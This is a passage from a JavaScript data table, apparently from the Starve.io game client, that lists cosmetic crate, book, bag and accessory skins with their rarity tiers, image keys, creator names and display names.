                            night: IMAGES.BAG41N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Bag with Reidite Swords"
                        }, {
                            id: 63,
                            day: IMAGES.BAG62D,
                            night: IMAGES.BAG62N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Engineer Bag"
                        }],
                        CRATE: [{
                            id: 0,
                            day: IMAGES.CRATE7D,
                            night: IMAGES.CRATE7N,
                            rarity: RARITY.FREE,
                            author: "eogito",
                            name: "Wooden Dead Box"
                        }, {
                            id: 1,
                            day: IMAGES.CRATE6D,
                            night: IMAGES.CRATE6N,
                            rarity: RARITY.FREE,
                            author: "eogito",
                            name: "Hidden item"
                        }, {
                            id: 2,
                            day: IMAGES.CRATE1D,
                            night: IMAGES.CRATE1N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wooden Box 1"
                        }, {
                            id: 3,
                            day: IMAGES.CRATE2D,
                            night: IMAGES.CRATE2N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wooden Box 2"
                        }, {
                            id: 4,
                            day: IMAGES.CRATE3D,
                            night: IMAGES.CRATE3N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wooden Box 3"
                        }, {
                            id: 5,
                            day: IMAGES.CRATE4D,
                            night: IMAGES.CRATE4N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Broken Wooden Box"
                        }, {
                            id: 6,
                            day: IMAGES.CRATE5D,
                            night: IMAGES.CRATE5N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wooden Box"
                        }, {
                            id: 7,
                            day: IMAGES.CRATE8D,
                            night: IMAGES.CRATE8N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wooden Battle Box"
                        }, {
                            id: 8,
                            day: IMAGES.CRATE9D,
                            night: IMAGES.CRATE9N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wooden Box with a Cross"
                        }, {
                            id: 9,
                            day: IMAGES.CRATE10D,
                            night: IMAGES.CRATE10N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wooden Box with Bubbles"
                        }, {
                            id: 10,
                            day: IMAGES.CRATE11D,
                            night: IMAGES.CRATE11N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wooden Box with Eyes"
                        }, {
                            id: 11,
                            day: IMAGES.CRATE12D,
                            night: IMAGES.CRATE12N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Dark Wooden Box"
                        }, {
                            id: 38,
                            day: IMAGES.CRATE39D,
                            night: IMAGES.CRATE39N,
                            rarity: RARITY.WOOD,
                            author: "Weddlz",
                            name: "Noob Box"
                        }, {
                            id: 12,
                            day: IMAGES.CRATE13D,
                            night: IMAGES.CRATE13N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Wooden and Stone Box"
                        }, {
                            id: 14,
                            day: IMAGES.CRATE19D,
                            night: IMAGES.CRATE19N,
                            rarity: RARITY.STONE,
                            author: "pizza wa",
                            name: "Star Box 1"
                        }, {
                            id: 15,
                            day: IMAGES.CRATE20D,
                            night: IMAGES.CRATE20N,
                            rarity: RARITY.STONE,
                            author: "pizza wa",
                            name: "Star Box 2"
                        }, {
                            id: 27,
                            day: IMAGES.CRATE29D,
                            night: IMAGES.CRATE29N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Flower Box"
                        }, {
                            id: 46,
                            day: IMAGES.CRATE47D,
                            night: IMAGES.CRATE47N,
                            rarity: RARITY.STONE,
                            author: "MADBalgouthi",
                            name: "Blue Box"
                        }, {
                            id: 19,
                            day: IMAGES.CRATE21D,
                            night: IMAGES.CRATE21N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Beehive"
                        }, {
                            id: 13,
                            day: IMAGES.CRATE14D,
                            night: IMAGES.CRATE14N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Wooden and Golden Box"
                        }, {
                            id: 21,
                            day: IMAGES.CRATE22D,
                            night: IMAGES.CRATE22N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Gravestone"
                        }, {
                            id: 25,
                            day: IMAGES.CRATE26D,
                            night: IMAGES.CRATE26N,
                            rarity: RARITY.GOLD,
                            author: "Communist",
                            name: "Sky Box"
                        }, {
                            id: 29,
                            day: IMAGES.CRATE30D,
                            night: IMAGES.CRATE30N,
                            rarity: RARITY.GOLD,
                            author: "Winter",
                            name: "Golden Box"
                        }, {
                            id: 34,
                            day: IMAGES.CRATE35D,
                            night: IMAGES.CRATE35N,
                            rarity: RARITY.GOLD,
                            author: "Communist",
                            name: "Water Crate"
                        }, {
                            id: 35,
                            day: IMAGES.CRATE36D,
                            night: IMAGES.CRATE36N,
                            rarity: RARITY.GOLD,
                            author: "Communist",
                            name: "Glass Crate"
                        }, {
                            id: 16,
                            day: IMAGES.CRATE15D,
                            night: IMAGES.CRATE15N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Wooden and Diamond Box"
                        }, {
                            id: 18,
                            day: IMAGES.CRATE18D,
                            night: IMAGES.CRATE18N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Don't Hit Me"
                        }, {
                            id: 26,
                            day: IMAGES.CRATE27D,
                            night: IMAGES.CRATE27N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Underwater Box"
                        }, {
                            id: 31,
                            day: IMAGES.CRATE32D,
                            night: IMAGES.CRATE32N,
                            rarity: RARITY.DIAMOND,
                            author: "Communist",
                            name: "Items Pile"
                        }, {
                            id: 32,
                            day: IMAGES.CRATE33D,
                            night: IMAGES.CRATE33N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Cake Box"
                        }, {
                            id: 33,
                            day: IMAGES.CRATE34D,
                            night: IMAGES.CRATE34N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Christmas Cake Box"
                        }, {
                            id: 36,
                            day: IMAGES.CRATE37D,
                            night: IMAGES.CRATE37N,
                            rarity: RARITY.DIAMOND,
                            author: "Fukss",
                            name: "Crab Box"
                        }, {
                            id: 42,
                            day: IMAGES.CRATE43D,
                            night: IMAGES.CRATE43N,
                            rarity: RARITY.DIAMOND,
                            author: "MADBalgouthi",
                            name: "Fishing Box"
                        }, {
                            id: 22,
                            day: IMAGES.CRATE23D,
                            night: IMAGES.CRATE23N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Let me out of here"
                        }, {
                            id: 17,
                            day: IMAGES.CRATE16D,
                            night: IMAGES.CRATE16N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Wooden and Amethyst Box"
                        }, {
                            id: 24,
                            day: IMAGES.CRATE25D,
                            night: IMAGES.CRATE25N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Aquarium"
                        }, {
                            id: 28,
                            day: IMAGES.CRATE28D,
                            night: IMAGES.CRATE28N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Gift Box"
                        }, {
                            id: 40,
                            day: IMAGES.CRATE41D,
                            night: IMAGES.CRATE41N,
                            rarity: RARITY.AMETHYST,
                            author: "MADBalgouthi",
                            name: "Open Watermelon Box"
                        }, {
                            id: 41,
                            day: IMAGES.CRATE42D,
                            night: IMAGES.CRATE42N,
                            rarity: RARITY.AMETHYST,
                            author: "MADBalgouthi",
                            name: "Watermelon Box"
                        }, {
                            id: 39,
                            day: IMAGES.CRATE40D,
                            night: IMAGES.CRATE40N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Thornbush Box"
                        }, {
                            id: 43,
                            day: IMAGES.CRATE44D,
                            night: IMAGES.CRATE44N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Rabbit in the Box"
                        }, {
                            id: 47,
                            day: IMAGES.CRATE48D,
                            night: IMAGES.CRATE48N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Garlic Plot"
                        }, {
                            id: 48,
                            day: IMAGES.CRATE49D,
                            night: IMAGES.CRATE49N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Pumpkin Plot"
                        }, {
                            id: 45,
                            day: IMAGES.CRATE46D,
                            night: IMAGES.CRATE46N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Autumn Box"
                        }, {
                            id: 44,
                            day: IMAGES.CRATE45D,
                            night: IMAGES.CRATE45N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Winter Box"
                        }, {
                            id: 20,
                            day: IMAGES.CRATE17D,
                            night: IMAGES.CRATE17N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Metal and Reidite Box"
                        }, {
                            id: 23,
                            day: IMAGES.CRATE24D,
                            night: IMAGES.CRATE24N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Kraken Box"
                        }, {
                            id: 30,
                            day: IMAGES.CRATE31D,
                            night: IMAGES.CRATE31N,
                            rarity: RARITY.REIDITE,
                            author: "Winter",
                            name: "Lava Box"
                        }, {
                            id: 37,
                            day: IMAGES.CRATE38D,
                            night: IMAGES.CRATE38N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Lava Box 2"
                        }, {
                            id: 49,
                            day: IMAGES.CRATE50D,
                            night: IMAGES.CRATE50N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Rabbit"
                        }, {
                            id: 50,
                            day: IMAGES.CRATE51D,
                            night: IMAGES.CRATE51N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Wolf"
                        }, {
                            id: 51,
                            day: IMAGES.CRATE52D,
                            night: IMAGES.CRATE52N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Spider"
                        }, {
                            id: 52,
                            day: IMAGES.CRATE53D,
                            night: IMAGES.CRATE53N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Hawk"
                        }, {
                            id: 53,
                            day: IMAGES.CRATE54D,
                            night: IMAGES.CRATE54N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Bear"
                        }, {
                            id: 54,
                            day: IMAGES.CRATE55D,
                            night: IMAGES.CRATE55N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Fox"
                        }, {
                            id: 55,
                            day: IMAGES.CRATE56D,
                            night: IMAGES.CRATE56N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Baby Mammoth"
                        }, {
                            id: 56,
                            day: IMAGES.CRATE57D,
                            night: IMAGES.CRATE57N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Mammoth"
                        }, {
                            id: 57,
                            day: IMAGES.CRATE58D,
                            night: IMAGES.CRATE58N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Sandworm"
                        }, {
                            id: 58,
                            day: IMAGES.CRATE59D,
                            night: IMAGES.CRATE59N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Vulture"
                        }, {
                            id: 59,
                            day: IMAGES.CRATE60D,
                            night: IMAGES.CRATE60N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Kraken"
                        }, {
                            id: 60,
                            day: IMAGES.CRATE61D,
                            night: IMAGES.CRATE61N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Piranha"
                        }, {
                            id: 61,
                            day: IMAGES.CRATE62D,
                            night: IMAGES.CRATE62N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Baby Dragon"
                        }, {
                            id: 62,
                            day: IMAGES.CRATE63D,
                            night: IMAGES.CRATE63N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Baby Lava"
                        }, {
                            id: 63,
                            day: IMAGES.CRATE64D,
                            night: IMAGES.CRATE64N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Dragon"
                        }, {
                            id: 64,
                            day: IMAGES.CRATE65D,
                            night: IMAGES.CRATE65N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Penguin"
                        }, {
                            id: 65,
                            day: IMAGES.CRATE66D,
                            night: IMAGES.CRATE66N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Lava Dragon"
                        }, {
                            id: 66,
                            day: IMAGES.CRATE67D,
                            night: IMAGES.CRATE67N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Boar"
                        }, {
                            id: 67,
                            day: IMAGES.CRATE68D,
                            night: IMAGES.CRATE68N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Fire mob"
                        }, {
                            id: 68,
                            day: IMAGES.CRATE69D,
                            night: IMAGES.CRATE69N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the Crab"
                        }, {
                            id: 69,
                            day: IMAGES.CRATE70D,
                            night: IMAGES.CRATE70N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Box of the King Crab"
                        }, {
                            id: 70,
                            day: IMAGES.CRATE71D,
                            night: IMAGES.CRATE71N,
                            rarity: RARITY.GOLD,
                            author: "CrysTal",
                            name: "Crystal Sky Box"
                        }, {
                            id: 71,
                            day: IMAGES.CRATE72D,
                            night: IMAGES.CRATE72N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Dragon Box"
                        }],
                        BOOK: [{
                            id: 0,
                            day: IMAGES.BOOK0D,
                            night: IMAGES.BOOK0N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Book 1"
                        }, {
                            id: 1,
                            day: IMAGES.BOOK3D,
                            night: IMAGES.BOOK3N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Book 2"
                        }, {
                            id: 2,
                            day: IMAGES.BOOK4D,
                            night: IMAGES.BOOK4N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Book 3"
                        }, {
                            id: 3,
                            day: IMAGES.BOOK5D,
                            night: IMAGES.BOOK5N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Book 4"
                        }, {
                            id: 4,
                            day: IMAGES.BOOK6D,
                            night: IMAGES.BOOK6N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Damaged Book 1"
                        }, {
                            id: 18,
                            day: IMAGES.BOOK18D,
                            night: IMAGES.BOOK18N,
                            rarity: RARITY.WOOD,
                            author: "SeveR",
                            name: "Damaged Book 2"
                        }, {
                            id: 5,
                            day: IMAGES.BOOK1D,
                            night: IMAGES.BOOK1N,
                            rarity: RARITY.STONE,
                            author: "Doctorpus",
                            name: "Scroll"
                        }, {
                            id: 6,
                            day: IMAGES.BOOK2D,
                            night: IMAGES.BOOK2N,
                            rarity: RARITY.STONE,
                            author: "Doctorpus",
                            name: "Clipboard"
                        }, {
                            id: 7,
                            day: IMAGES.BOOK7D,
                            night: IMAGES.BOOK7N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Seed Book"
                        }, {
                            id: 20,
                            day: IMAGES.BOOK20D,
                            night: IMAGES.BOOK20N,
                            rarity: RARITY.STONE,
                            author: "Taco4Life",
                            name: "Camo Book"
                        }, {
                            id: 24,
                            day: IMAGES.BOOK24D,
                            night: IMAGES.BOOK24N,
                            rarity: RARITY.STONE,
                            author: "Communist",
                            name: "Stone Tablet"
                        }, {
                            id: 10,
                            day: IMAGES.BOOK13D,
                            night: IMAGES.BOOK13N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Star Book"
                        }, {
                            id: 8,
                            day: IMAGES.BOOK9D,
                            night: IMAGES.BOOK9N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Gold Book"
                        }, {
                            id: 15,
                            day: IMAGES.BOOK15D,
                            night: IMAGES.BOOK15N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Old Mysterious Paper"
                        }, {
                            id: 17,
                            day: IMAGES.BOOK17D,
                            night: IMAGES.BOOK17N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Gold Engraving"
                        }, {
                            id: 25,
                            day: IMAGES.BOOK25D,
                            night: IMAGES.BOOK25N,
                            rarity: RARITY.GOLD,
                            author: "fatant",
                            name: "Ant Book"
                        }, {
                            id: 32,
                            day: IMAGES.BOOK32D,
                            night: IMAGES.BOOK32N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Mummy Book"
                        }, {
                            id: 37,
                            day: IMAGES.BOOK39D,
                            night: IMAGES.BOOK39N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Garlic Book"
                        }, {
                            id: 38,
                            day: IMAGES.BOOK38D,
                            night: IMAGES.BOOK38N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Pumpkin Book"
                        }, {
                            id: 39,
                            day: IMAGES.BOOK40D,
                            night: IMAGES.BOOK40N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Christmas Tree Book"
                        }, {
                            id: 11,
                            day: IMAGES.BOOK10D,
                            night: IMAGES.BOOK10N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Diamond Book"
                        }, {
                            id: 9,
                            day: IMAGES.BOOK8D,
                            night: IMAGES.BOOK8N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Obscure Book"
                        }, {
                            id: 16,
                            day: IMAGES.BOOK16D,
                            night: IMAGES.BOOK16N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Rolled Parchment"
                        }, {
                            id: 22,
                            day: IMAGES.BOOK22D,
                            night: IMAGES.BOOK22N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Cake Book"
                        }, {
                            id: 23,
                            day: IMAGES.BOOK23D,
                            night: IMAGES.BOOK23N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Christmas Cake Book"
                        }, {
                            id: 30,
                            day: IMAGES.BOOK30D,
                            night: IMAGES.BOOK30N,
                            rarity: RARITY.DIAMOND,
                            author: "MADBalgouthi",
                            name: "Fish Book"
                        }, {
                            id: 31,
                            day: IMAGES.BOOK31D,
                            night: IMAGES.BOOK31N,
                            rarity: RARITY.DIAMOND,
                            author: "CrysTal",
                            name: "Once upon a time"
                        }, {
                            id: 13,
                            day: IMAGES.BOOK11D,
                            night: IMAGES.BOOK11N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Amethyst Book"
                        }, {
                            id: 28,
                            day: IMAGES.BOOK28D,
                            night: IMAGES.BOOK28N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Paint Pallet"
                        }, {
                            id: 29,
                            day: IMAGES.BOOK29D,
                            night: IMAGES.BOOK29N,
                            rarity: RARITY.AMETHYST,
                            author: "CrysTal",
                            name: "Watermelon Book"
                        }, {
                            id: 27,
                            day: IMAGES.BOOK27D,
                            night: IMAGES.BOOK27N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Thornbush Book"
                        }, {
                            id: 35,
                            day: IMAGES.BOOK35D,
                            night: IMAGES.BOOK35N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Menu"
                        }, {
                            id: 36,
                            day: IMAGES.BOOK36D,
                            night: IMAGES.BOOK36N,
                            rarity: RARITY.AMETHYST,
                            author: "CrysTal",
                            name: "Lover Letter"
                        }, {
                            id: 40,
                            day: IMAGES.BOOK41D,
                            night: IMAGES.BOOK41N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Fresh-Baked Cookies"
                        }, {
                            id: 41,
                            day: IMAGES.BOOK42D,
                            night: IMAGES.BOOK42N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Inside, there is just a book."
                        }, {
                            id: 33,
                            day: IMAGES.BOOK33D,
                            night: IMAGES.BOOK33N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Winter Book"
                        }, {
                            id: 34,
                            day: IMAGES.BOOK34D,
                            night: IMAGES.BOOK34N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Autumn Book"
                        }, {
                            id: 14,
                            day: IMAGES.BOOK12D,
                            night: IMAGES.BOOK12N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Reidite Book"
                        }, {
                            id: 12,
                            day: IMAGES.BOOK14D,
                            night: IMAGES.BOOK14N,
                            rarity: RARITY.REIDITE,
                            author: "Winter",
                            name: "Lava Book"
                        }, {
                            id: 26,
                            day: IMAGES.BOOK26D,
                            night: IMAGES.BOOK26N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Lava Book 2"
                        }, {
                            id: 19,
                            day: IMAGES.BOOK19D,
                            night: IMAGES.BOOK19N,
                            rarity: RARITY.REIDITE,
                            author: "Winter",
                            name: "Ocean Mystery"
                        }, {
                            id: 21,
                            day: IMAGES.BOOK21D,
                            night: IMAGES.BOOK21N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Dragon Book"
                        }, {
                            id: 42,
                            day: IMAGES.BOOK43D,
                            night: IMAGES.BOOK43N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Engineer Book"
                        }, {
                            id: 43,
                            day: IMAGES.BOOK44D,
                            night: IMAGES.BOOK44N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Nightmare Book"
                        }, {
                            id: 44,
                            day: IMAGES.BOOK45D,
                            night: IMAGES.BOOK45N,
                            rarity: RARITY.REIDITE,
                            author: "aloner",
                            name: "Mystery Book"
                        }],
                        ACCESSORY: [{
                            id: 0,
                            day: IMAGES.ACCESSORY0D,
                            night: IMAGES.ACCESSORY0D,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Nothing"
                        }, {
                            id: 2,
                            day: IMAGES.ACCESSORY4D,
                            night: IMAGES.ACCESSORY4N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Pink Cheeks"
                        }, {
                            id: 3,
                            day: IMAGES.ACCESSORY5D,
                            night: IMAGES.ACCESSORY5N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Heart"
                        }, {
                            id: 1,
                            day: IMAGES.ACCESSORY3D,
                            night: IMAGES.ACCESSORY3N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Bandage 1"
                        }, {
                            id: 4,
                            day: IMAGES.ACCESSORY6D,
                            night: IMAGES.ACCESSORY6N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Flower 1"
                        }, {
                            id: 5,
                            day: IMAGES.ACCESSORY8D,
                            night: IMAGES.ACCESSORY8N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Bow 1"
                        }, {
                            id: 6,
                            day: IMAGES.ACCESSORY9D,
                            night: IMAGES.ACCESSORY9N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Bandage 2"
                        }, {
                            id: 7,
                            day: IMAGES.ACCESSORY15D,
                            night: IMAGES.ACCESSORY15N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Flower 2"
                        }, {
                            id: 8,
                            day: IMAGES.ACCESSORY10D,
                            night: IMAGES.ACCESSORY10N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Bandage 3"
                        }, {
                            id: 36,
                            day: IMAGES.ACCESSORY36D,
                            night: IMAGES.ACCESSORY36N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Foliage"
                        }, {
                            id: 59,
                            day: IMAGES.ACCESSORY47D,
                            night: IMAGES.ACCESSORY47N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Peaceful"
                        }, {
                            id: 67,
                            day: IMAGES.ACCESSORY55D,
                            night: IMAGES.ACCESSORY55N,
                            rarity: RARITY.WOOD,
                            author: "pizza wa",
                            name: "Sparkles"
                        }, {
                            id: 68,
                            day: IMAGES.ACCESSORY56D,
                            night: IMAGES.ACCESSORY56N,
                            rarity: RARITY.WOOD,
                            author: "pizza wa",
                            name: "Luxury"
                        }, {
                            id: 69,
                            day: IMAGES.ACCESSORY57D,
                            night: IMAGES.ACCESSORY57N,
                            rarity: RARITY.WOOD,
                            author: "pizza wa",
                            name: "Snow Flakes Crown"
                        }, {
                            id: 17,
                            day: IMAGES.ACCESSORY17D,
                            night: IMAGES.ACCESSORY17N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Glasses 1"
                        }, {
                            id: 10,
                            day: IMAGES.ACCESSORY7D,
                            night: IMAGES.ACCESSORY7N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Bow 2"
                        }, {
                            id: 11,
                            day: IMAGES.ACCESSORY13D,
                            night: IMAGES.ACCESSORY13N,
                            rarity: RARITY.STONE,
                            author: "pizza wa",
                            name: "Little Stars"
                        }, {
                            id: 12,
                            day: IMAGES.ACCESSORY11D,
                            night: IMAGES.ACCESSORY11N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Pirate Eye Patch 1"
                        }, {
                            id: 44,
                            day: IMAGES.ACCESSORY44D,
                            night: IMAGES.ACCESSORY44N,
                            rarity: RARITY.STONE,
                            author: "Taco4Life",
                            name: "Pirate Eye Patch 2"
                        }, {
                            id: 23,
                            day: IMAGES.ACCESSORY23D,
                            night: IMAGES.ACCESSORY23N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Clown nose"
                        }, {
                            id: 16,
                            day: IMAGES.ACCESSORY2D,
                            night: IMAGES.ACCESSORY2N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Eye Patch"
                        }, {
                            id: 30,
                            day: IMAGES.ACCESSORY30D,
                            night: IMAGES.ACCESSORY30N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Flower 3"
                        }, {
                            id: 38,
                            day: IMAGES.ACCESSORY38D,
                            night: IMAGES.ACCESSORY38N,
                            rarity: RARITY.STONE,
                            author: "Winter",
                            name: "False Nose"
                        }, {
                            id: 74,
                            day: IMAGES.ACCESSORY62D,
                            night: IMAGES.ACCESSORY62N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Red Cloth"
                        }, {
                            id: 75,
                            day: IMAGES.ACCESSORY63D,
                            night: IMAGES.ACCESSORY63N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Blue Cloth"
                        }, {
                            id: 79,
                            day: IMAGES.ACCESSORY67D,
                            night: IMAGES.ACCESSORY67N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Transparent Mask"
                        }, {
                            id: 89,
                            day: IMAGES.ACCESSORY77D,
                            night: IMAGES.ACCESSORY77N,
                            rarity: RARITY.STONE,
                            author: "Anyone want to play?",
                            name: "Starve.io Anime"
                        }, {
                            id: 94,
                            day: IMAGES.ACCESSORY78D,
                            night: IMAGES.ACCESSORY78N,
                            rarity: RARITY.STONE,
                            author: "Ant",
                            name: "Hero Mask"
                        }, {
                            id: 15,
                            day: IMAGES.ACCESSORY16D,
                            night: IMAGES.ACCESSORY16N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Star Glasses"
                        }, {
                            id: 21,
                            day: IMAGES.ACCESSORY21D,
                            night: IMAGES.ACCESSORY21N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Great-aunt's Glasses"
                        }, {
                            id: 24,
                            day: IMAGES.ACCESSORY24D,
                            night: IMAGES.ACCESSORY24N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Little Starver"
                        }, {
                            id: 22,
                            day: IMAGES.ACCESSORY22D,
                            night: IMAGES.ACCESSORY22N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Little Glasses"
                        }, {
                            id: 13,
                            day: IMAGES.ACCESSORY14D,
                            night: IMAGES.ACCESSORY14N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Flower Chain"
                        }, {
                            id: 29,
                            day: IMAGES.ACCESSORY29D,
                            night: IMAGES.ACCESSORY29N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Horns"
                        }, {
                            id: 31,
                            day: IMAGES.ACCESSORY31D,
                            night: IMAGES.ACCESSORY31N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Golden Flower"
                        }, {
                            id: 40,
                            day: IMAGES.ACCESSORY40D,
                            night: IMAGES.ACCESSORY40N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Sleeping Mask"
                        }, {
                            id: 57,
                            day: IMAGES.ACCESSORY50D,
                            night: IMAGES.ACCESSORY50N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Fish on your head"
                        }, {
                            id: 58,
                            day: IMAGES.ACCESSORY46D,
                            night: IMAGES.ACCESSORY46N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Rose"
                        }, {
                            id: 91,
                            day: IMAGES.ACCESSORY80D,
                            night: IMAGES.ACCESSORY80N,
                            rarity: RARITY.GOLD,
                            author: "upfiz",
                            name: "Grey Scarf"
                        }, {
                            id: 92,
                            day: IMAGES.ACCESSORY81D,
                            night: IMAGES.ACCESSORY81N,
                            rarity: RARITY.GOLD,
                            author: "upfiz",
                            name: "Black Scarf"
                        }, {
                            id: 93,
                            day: IMAGES.ACCESSORY82D,
